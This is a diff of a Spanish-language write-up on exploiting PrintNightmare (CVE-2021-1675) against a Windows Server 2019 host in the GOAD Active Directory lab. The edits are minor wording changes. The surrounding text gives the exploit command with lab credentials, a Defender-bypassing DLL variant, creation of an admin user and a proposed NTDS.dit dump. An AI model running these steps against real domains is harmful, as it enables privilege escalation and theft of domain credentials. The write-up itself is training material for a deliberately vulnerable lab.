@@ -2657,7 +2657,7 @@ SMB         essos.local     445    MEEREEN          [*] grep -iv disabled /root/
 
 ## PrintNightmare Windows Server 2019
 
-Ahora vamos a realizar el mismo ataque pero como dice el título en un windows server 2019, se cuenta con dos archivos, pero uno de ellos es detectado por el defender así que en este caso, vamos a ir a la fija con el archivo que realizar el bypass al defender, si quieres ver el archivo anterios puede verlo desde acá [GOAD](https://mayfly277.github.io/posts/GOADv2-pwning-part5/#exploit-on-vulnerable-windows-server-2019-winterfell) para este ejemplo vamos a llamar el archivo como nightmare2.c
+Ahora vamos a realizar el mismo ataque pero como dice el título en un windows server 2019, se cuenta con dos archivos, pero uno de ellos es detectado por el defender así que en este caso, vamos a ir a la fija con el archivo que realizar el bypass al defender, si quieres ver el archivo anterios puede verlo desde [GOAD](https://mayfly277.github.io/posts/GOADv2-pwning-part5/#exploit-on-vulnerable-windows-server-2019-winterfell){:target="_blank"}  para este ejemplo vamos a llamar el archivo como nightmare2.c y como en la exploación anterior, también vamos a crear un usuario llamado angussmoody
 
 ```c
 /*
@@ -2846,7 +2846,7 @@ vamos a realizar el ataque contra north.sevenkingdoms.local que responde a la IP
 SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
 ```
 
-ahora vamos a correr el script con el comando `python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:'iknownothing'@winterfell.north.sevenkingdoms.local '\\192.168.56.104\share\nightmare2.dll'` para este caso 192.168.56.104 es la IP que me entrega el laboratorio y  share es el nombre que le puse al recurso compartido, y vemos que nos dice que el exploit Completed (Explotación finalizada)
+ahora vamos a correr el script con el comando `python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:'iknownothing'@winterfell.north.sevenkingdoms.local '\\192.168.56.104\share\nightmare2.dll'` para este caso 192.168.56.104 es la IP que me entrega el laboratorio y  share es el nombre que le puse al recurso compartido, y vemos que nos dice exploit Completed (Explotación finalizada)
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
@@ -2888,7 +2888,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Remaining connections []
 ```
 
-Ahora vamos a comprobar con crackmapexec si se realizó la creación de el usuario con el comando  `cme smb north.sevenkingdoms.local -u angussmoody -p 'Test123456789!'` y vemos que este ya nos responde y nos da la etiqueta (Pwn3d!) lo cual podemos aprovechar para ejecutar comando o en este caso realizar un volcado del archivo NTDS. dit  (NT Directory Services Database) es el archivo de base de datos principal utilizado por el servicio Active Directory en los sistemas operativos Windows Server
+Ahora vamos a comprobar con crackmapexec si se realizó la creación del usuario con el comando  `cme smb north.sevenkingdoms.local -u angussmoody -p 'Test123456789!'` y vemos que este ya nos responde y nos da la etiqueta (Pwn3d!) lo cual podemos aprovechar para ejecutar comandos o en este caso realizar un volcado del archivo NTDS. dit  (NT Directory Services Database) es el archivo de base de datos principal utilizado por el servicio Active Directory en los sistemas operativos Windows Server
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
